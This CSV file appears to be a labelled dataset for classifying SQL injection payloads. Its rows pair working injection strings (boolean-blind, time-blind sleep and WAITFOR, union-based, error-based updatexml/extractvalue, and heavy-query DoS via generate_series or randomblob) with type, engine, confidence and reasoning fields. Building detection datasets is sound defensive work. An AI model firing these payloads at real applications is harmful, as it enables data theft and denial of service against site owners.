id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
23744,1 ) ) as ctqr where 2609 = 2609,boolean_blind,generic,0.70,Boolean equality test (2609 = 2609) without SQLi signal; classification confirmed by pattern analysis,1
23745,1 ) where 4866 = 4866,boolean_blind,generic,0.70,Boolean condition (WHERE 4866 = 4866) for true/false branch testing in blind SQLi,1
23746,"1'+ ( select 'zxxh' where 4065 = 4065 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.90,PostgreSQL generate_series(1,5000000) detected → heavy_query DoS; large set generation causes CPU starvation attack,2
23747,"1"" and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ""svse"" = ""svse",boolean_blind,mysql,0.85,ELT() boolean conditional detected → boolean_blind SQLi; MySQL ELT function for condition testing,2
23748,"1' ) where 5276 = 5276 union all select null,null--",union_based,generic,0.85,UNION ALL SELECT detected → union_based SQLi; column count mismatch with null padding pattern,2
23749,1 ) ) ) or sleep ( 5 ) and ( ( ( 2209 = 2209,time_blind,mysql,0.90,sleep() function detected → time_blind SQLi; MySQL time-based delay signature; 5 second timeout,2
23750,"1' ) as zxho where 5907 = 5907 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,sqlite,0.90,randomblob() with 500M argument detected → heavy_query DoS; SQLite memory exhaustion attack,2
23751,"1%"" ) or sleep ( 5 ) #",time_blind,mysql,0.90,sleep() function detected → time_blind SQLi; MySQL time-based delay signature,2
23752,"1' ) where 8348 = 8348 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.85,ELT() function detected → boolean_blind SQLi; MySQL ELT(cond, value) boolean check,2
23753,1 waitfor delay '0:0:5'--,time_blind,mssql,0.95,WAITFOR DELAY detected → time_blind SQLi; MSSQL-specific timing function; 5 second delay,2
23754,"1'|| ( select 'aair' where 9234 = 9234 union all select null,null,null,null#",union_based,generic,0.85,UNION ALL SELECT detected → union_based SQLi; null column alignment pattern,2
23755,"-4165"" where 1772 = 1772 union all select 1772,1772,1772,1772,1772,1772,1772,1772--",union_based,generic,0.85,UNION ALL SELECT detected → union_based SQLi; 8-column injection with numeric padding,2
23756,"1%"" ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""%"" = """,heavy_query,generic,0.75,Large regexp_substring/repeat combination with 500M iterations detected; DoS via CPU exhaustion,1
23757,"-8521' ) union all select 2446,2446,2446,2446,2446,2446,2446#",union_based,generic,0.85,UNION ALL SELECT detected → union_based SQLi; 7-column numeric injection,2
23758,"1%' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and '%' = '",error_based,mysql,0.95,updatexml() detected → error_based SQLi; MySQL XPath error-based extraction technique,2
23759,"1%"" procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ""%"" = """,error_based,mysql,0.95,extractvalue() detected → error-based SQLi; MySQL XPath error signal with PROCEDURE ANALYSE wrapper,2
23760,"-8109%"" ) ) union all select 9089,9089--",union_based,generic,0.85,UNION ALL SELECT detected → union_based SQLi; 2-column injection,2
